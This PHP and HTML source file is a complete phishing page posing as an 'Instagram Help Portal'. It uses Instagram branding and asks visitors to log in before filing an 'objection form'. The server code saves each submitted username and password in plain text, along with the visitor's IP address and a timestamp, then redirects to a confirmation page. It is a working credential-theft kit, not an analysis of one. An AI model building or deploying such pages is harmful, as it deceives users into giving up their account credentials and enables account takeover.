<?php require_once("includes/DB.php"); ?>
<?php require_once("includes/Functions.php"); ?>
<?php require_once("includes/Sessions.php"); ?>
<?php
    if(isset($_POST["submit"])){
      $ins_name = $_POST["insName"];
      $ins_Pass = $_POST["insPassword"];


    //------ Current Date and Time ---------//
    date_default_timezone_set("Africa/Lagos");
    $CurrentTime = time();
    $DateTime = strftime(date("F j, Y, g:i a") ,$CurrentTime);
    //echo  $DateTime;

// ------------------IP ADRESS-----------------//
    $ip = getIp();
    

     //------------------------------------------//
     if(empty($ins_name) || empty($ins_Pass) ) {
      $_SESSION["ErrorMessage"] = "Please input right username & password to countinue";
      Redirect_to("index.php");

     }else {
      //----Query to insert Comments Into the DB --------
      global $ConnectingDB;
   $sql  = "INSERT INTO username(username, password, datetime, ip_add)";
   $sql .= "VALUES(:UserName, :UserPassword, :DateTime, :IP_Add)";
   $stmt = $ConnectingDB->prepare($sql);
   $stmt->bindValue(':UserName',  $ins_name);
   $stmt->bindValue(':UserPassword',  $ins_Pass);
   $stmt->bindValue(':DateTime',  $DateTime);
   $stmt->bindValue(':IP_Add',  $ip);
  

   $Execute = $stmt->execute();
  //  var_dump($Execute);
  if($Execute){
      Redirect_to("confirmation.php");
    }else {
      $_SESSION["ErrorMessage"]="Something went wrong. Try Again !";
      Redirect_to("index.php");
      }
    }

}
  
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <!-- bootstrap css -->
   <link rel="shortcut icon" type="image/png" href="img/instagramsmall.png"/>
  <!-- Bootstrap CSS -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css" 
  integrity="sha384-zCbKRCUGaJDkqS1kPbPd7TveP5iyJE0EjAuZQTgFLD2ylzuqKfdKlfG/eSrtxUkn" crossorigin="anonymous">

  <link rel="stylesheet" href="css/main.css">
  <title>Instagram Help suport</title>
</head>
<!-- style notfication -- -->
<?php
      include("includes/style.php");
  ?>
<body>
   <section>
     <div class="container my-3">
       <div class="row my-4">

        <!-- contain starts Here --- -->


        <div class="card">
          <img src="img/instagram.png" class="card-img-top img-fluid card-img" alt="instagram_logo">
          <div class="card-body">
            <h5 class="card-title">Instagram Help Portal </h5>
            <p class="card-text">Before completing the objection form, you must login with your account.</p>
            
            <?php
                    echo ErrorMessage();
                    echo SuccessMessage();
                ?>
            <form class="form-class" action="index.php" method="post">
              <div class="col-auto">
                <label class="sr-only" for="inlineFormInputGroup">username</label>
                <div class="input-group mb-2">
                  <div class="input-group-prepend">
                    <div class="input-group-text">@</div>
                  </div>
                  <input type="text" name="insName" class="form-control" id="inlineFormInputGroup" placeholder="username">
                </div>
              </div>

              <div class="col-auto">
                <label class="sr-only" for="inlineFormInputGroup">Password</label>
                <div class="input-group mb-2">
                  <div class="input-group-prepend">
                    <div class="input-group-text"><i class="fas fa-lock"></i></div>
                  </div>
                  <input type="password" name="insPassword" class="form-control" id="inlineFormInputGroup" placeholder="password">
                </div>
              </div>
                
                <button type="submit" name="submit" class="btn btn3 btn-primary btn-block my-3 ml-3">Next</button>      
          </form>

          </div>   
        </div>


       </div>
     </div>
    
   </section>



   <!-- Option 1: jQuery and Bootstrap Bundle (includes Popper) -->
   <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js" 
   integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/js/bootstrap.bundle.min.js" 
   integrity="sha384-fQybjgWLrvvRgtW6bFlB7jaZrFsaBXjsOMm/tB9LTS58ONXgqbR9W8oWht/amnpF" crossorigin="anonymous"></script>
        <!--fontawesome kit-->
  <script src="https://kit.fontawesome.com/37e4e6b527.js" crossorigin="anonymous"></script>
</body>
</html>